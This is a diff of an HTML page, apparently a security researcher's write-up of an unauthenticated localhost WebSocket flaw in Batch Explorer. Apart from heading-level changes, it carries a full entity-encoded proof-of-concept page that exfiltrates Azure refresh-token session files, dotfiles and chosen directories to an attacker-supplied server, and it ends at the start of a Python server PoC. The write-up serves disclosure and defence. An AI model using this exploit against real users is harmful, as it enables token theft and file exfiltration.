@@ -141,7 +141,7 @@
 
         <hr />
 
-        <h2>What Was the Risk?</h2>
+        <h3>What Was the Risk?</h3>
         <p>
           If you ran a vulnerable version of Batch Explorer and simply opened a malicious webpage,
           that page could:
@@ -155,7 +155,7 @@
           The app exposed a local control plane to the browser without validating who was talking to it.
         </p>
 
-        <h2>What Could Be Stolen?</h2>
+        <h3>What Could Be Stolen?</h3>
         <ul>
           <li>Any file the app could read: docs, shell configs, credential stores—even your entire user folder</li>
           <li>Azure refresh tokens with scopes such as <code>offline_access</code>, <code>openid</code>,
@@ -166,7 +166,7 @@
           to full Azure privilege escalation.
         </p>
 
-        <h2>How the PoC Worked</h2>
+        <h3>How the PoC Worked</h3>
         <ol>
           <li>Attacker hosts a malicious HTTPS page and a fake “Azure” endpoint using a Python server.</li>
           <li>Victim opens Batch Explorer, which spins up a WebSocket on localhost:45032.</li>
@@ -180,7 +180,7 @@
           even if it pointed outside Azure.
         </p>
 
-        <h2>Why It Was Missed</h2>
+        <h3>Why It Was Missed</h3>
         <p>
           This wasn’t a subtle race condition or side-channel trick. It boiled down to:
         </p>
@@ -194,7 +194,7 @@
           equals safe.
         </p>
 
-        <h2>On Bug Bounties and Scope</h2>
+        <h3>On Bug Bounties and Scope</h3>
         <p>
           Microsoft marked this out of scope because the app is open source. That’s technically correct,
           but they’re the sole maintainer and publisher—this isn’t a forgotten community fork.
@@ -205,7 +205,7 @@
           license notwithstanding.
         </p>
 
-        <h2>Key Lessons</h2>
+        <h3>Key Lessons</h3>
         <ul>
           <li>Enforce authentication and origin checks on every local RPC interface</li>
           <li>Don’t assume browser equals trusted—treat web inputs as untrusted data</li>
@@ -213,18 +213,18 @@
           <li>Vendor trust boundaries don’t always match your own—revalidate assumptions for every tool</li>
         </ul>
 
-        <h2>Wrapping Up</h2>
+        <h3>Wrapping Up</h3>
         <p>
           The patch rolled out quickly, which is great. But the root cause—unauthenticated local
           control interfaces—is still popping up across tooling. If your app runs alongside the browser
           and can touch tokens or files, make authentication a hard requirement, even for localhost.
         </p>
 
-        <h2>PoC HTML</h2>
+        <h3>PoC HTML</h3>
         <pre class="code-green"><code>&#x0a;&#x3c;html&#x3e;&#x0a;&#x3c;head&#x3e;&#x0a;&#x3c;script&#x3e;&#x0a;function batchExfil&#x28;fileOrFolder&#x2c;malServer&#x2c;recurse&#x29;&#x7b;&#x0a;try&#x7b;ws&#x2e;close&#x28;&#x29;&#x7d;catch&#x28;e&#x29;&#x7b;&#x7d;&#x0a;const ws &#x3d; new WebSocket&#x28;&#x27;ws&#x3a;&#x2f;&#x2f;1&#x3a;1&#x40;127&#x2e;0&#x2e;0&#x2e;1&#x3a;45032&#x2f;&#x27;&#x29;&#x0a;ws&#x2e;onopen &#x3d; &#x28;&#x29; &#x3d;&#x3e; &#x7b;&#x0a;  console&#x2e;log&#x28;&#x27;ws opened on browser&#x27;&#x29;&#x0a;  ws&#x2e;send&#x28;&#x60;&#x0a;          &#x7b;&#x22;jsonrpc&#x22;&#x3a;&#x22;2&#x2e;0&#x22;&#x2c;&#x0a;           &#x22;method&#x22;&#x3a;&#x22;create-file-group&#x22;&#x2c;&#x0a;           &#x22;params&#x22;&#x3a;&#x5b;&#x22;asdzwzw&#x22;&#x2c;&#x22;&#x24;&#x7b;fileOrFolder&#x7d;&#x22;&#x2c;&#x7b;&#x0a;                     &#x22;fullpath&#x22;&#x3a;true&#x2c; &#x22;prefix&#x22;&#x3a;false&#x2c; &#x22;flatten&#x22;&#x3a;false&#x2c;&#x22;recursive&#x22;&#x3a;&#x24;&#x7b;recurse&#x7d;&#x0a;                     &#x7d;&#x5d;&#x2c;&#x0a;            &#x22;id&#x22;&#x3a;0&#x2c;&#x0a;            &#x22;request&#x5f;id&#x22;&#x3a;0&#x2c;&#x0a;           &#x22;options&#x22;&#x3a;&#x7b;&#x0a;               &#x22;authentication&#x22;&#x3a;&#x7b;&#x0a;                   &#x22;batchToken&#x22;&#x3a;&#x22;a&#x2e;a&#x2e;azwzw&#x22;&#x2c;&#x0a;                   &#x22;armToken&#x22;&#x3a;&#x22;a&#x2e;a&#x2e;azwzw&#x22;&#x2c;&#x0a;                   &#x22;armUrl&#x22;&#x3a;&#x22;https&#x3a;&#x2f;&#x2f;&#x24;&#x7b;malServer&#x7d;&#x2f;&#x22;&#x2c;&#x0a;                   &#x22;storageEndpoint&#x22;&#x3a;&#x22;&#x40;&#x24;&#x7b;malServer&#x7d;&#x2f;storageendpoint&#x2f;&#x22;&#x2c;&#x0a;                   &#x22;account&#x22;&#x3a;&#x7b;&#x0a;            &#x22;id&#x22;&#x3a; &#x22;&#x2f;subscriptions&#x2f;00000000-0000-0000-0000-000000000000&#x2f;resourceGroups&#x2f;test-tmp2&#x2f;providers&#x2f;Microsoft&#x2e;Batch&#x2f;batchAccounts&#x2f;testaccountmsobb&#x22;&#x2c;&#x0a;            &#x22;name&#x22;&#x3a; &#x22;testaccountmsobb&#x22;&#x2c;&#x0a;            &#x22;type&#x22;&#x3a; &#x22;Microsoft&#x2e;Batch&#x2f;batchAccounts&#x22;&#x2c;&#x0a;            &#x22;location&#x22;&#x3a; &#x22;canadacentral&#x22;&#x2c;&#x0a;            &#x22;subscription&#x22;&#x3a;&#x7b;&#x22;subscriptionId&#x22;&#x3a;&#x22;00000000-0000-0000-0000-000000000000&#x22;&#x7d;&#x2c;&#x0a;            &#x22;properties&#x22;&#x3a; &#x7b;&#x0a;                           &#x0a;                &#x22;accountEndpoint&#x22;&#x3a; &#x22;testaccountmsobb&#x2e;canadacentral&#x2e;[REDACTED]&#x22;&#x2c;&#x0a;                &#x22;nodeManagementEndpoint&#x22;&#x3a; &#x22;76ccb063-54c8-4de3-aacb-304ccb86c7c3&#x2e;canadacentral&#x2e;service&#x2e;batch&#x2e;azure&#x2e;com&#x22;&#x2c;&#x0a;                &#x22;poolAllocationMode&#x22;&#x3a; &#x22;BatchService&#x22;&#x2c;&#x0a;                &#x22;publicNetworkAccess&#x22;&#x3a; &#x22;Enabled&#x22;&#x2c;&#x0a;                &#x22;networkProfile&#x22;&#x3a; &#x7b;&#x0a;                    &#x22;accountAccess&#x22;&#x3a; &#x7b;&#x0a;                        &#x22;defaultAction&#x22;&#x3a; &#x22;Allow&#x22;&#x0a;                    &#x7d;&#x0a;                &#x7d;&#x2c;&#x0a;                &#x22;encryption&#x22;&#x3a; &#x7b;&#x0a;                    &#x22;keySource&#x22;&#x3a; &#x22;Microsoft&#x2e;Batch&#x22;&#x0a;                &#x7d;&#x0a;            &#x7d;&#x2c;&#x0a;            &#x22;identity&#x22;&#x3a; &#x7b;&#x0a;                &#x22;type&#x22;&#x3a; &#x22;None&#x22;&#x0a;            &#x7d;&#x0a;        &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x60;&#x29;&#x0a;&#x7d;&#x0a;&#x0a;ws&#x2e;onmessage &#x3d; &#x28;message&#x29; &#x3d;&#x3e; &#x7b;&#x0a;  console&#x2e;log&#x28;&#x60;message received&#x60;&#x2c; message&#x2e;data&#x29;&#x0a;&#x7d;&#x0a;&#x7d;&#x0a;&#x3c;&#x2f;script&#x3e;&#x0a;&#x3c;head&#x3e;&#x0a;&#x3c;body&#x3e;&#x0a;&#x3c;h1&#x3e;Poc page for batch explorer vulnerability&#x3c;&#x2f;h1&#x3e;&#x0a;&#x3c;div&#x3e;&#x0a;Input your malicious domain hosting the python server ex&#x3a;&#x22;example&#x2e;loc&#x22;&#x0a;&#x3c;input id&#x3d;&#x22;maldomain&#x22; value&#x3d;&#x22;&#x22;&#x3e;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil the tab file which contains the refresh token that was used to connect to the app &#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;refreshToken&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;Users&#x2f;&#x2a;&#x2f;AppData&#x2f;Local&#x2f;Microsoft&#x2f;Edge&#x2f;User Data&#x2f;Default&#x2f;Sessions&#x2f;tab&#x2a;&#x22; disabled&#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;refreshToken&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;escalate privileges by exfiltrating azure&#x2f;m365 refresh token&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil username and dot file such as &#x2e;gitconfig&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;exfilUsers&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;Users&#x2f;&#x2a;&#x2f;&#x2e;&#x2a;&#x22; disabled&#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;exfilUsers&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;exfiltrate users&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil from any directory recursively&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;exfilDir&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;ProgramData&#x2f;Microsoft&#x2f;Windows&#x2f;Start Menu&#x2f;Programs&#x2f;Accessories&#x22; &#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;exfilDir&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;true&#x29;&#x22;&#x3e;exfiltrate a directory of your choice&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil a single file&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;singleFile&#x22; size&#x3d;200 value&#x3d;&#x22;c&#x3a;&#x2f;windows&#x2f;debug&#x2f;netsetup&#x2e;log&#x22; &#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;singleFile&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;exfiltrate a file of your choice&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;body&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;html&#x3e;
 </code></pre>
 
-        <h2>Python Server PoC</h2>
+        <h3>Python Server PoC</h3>
         <pre class="code-green"><code>from http.server import HTTPServer,SimpleHTTPRequestHandler
 import http
 import ssl
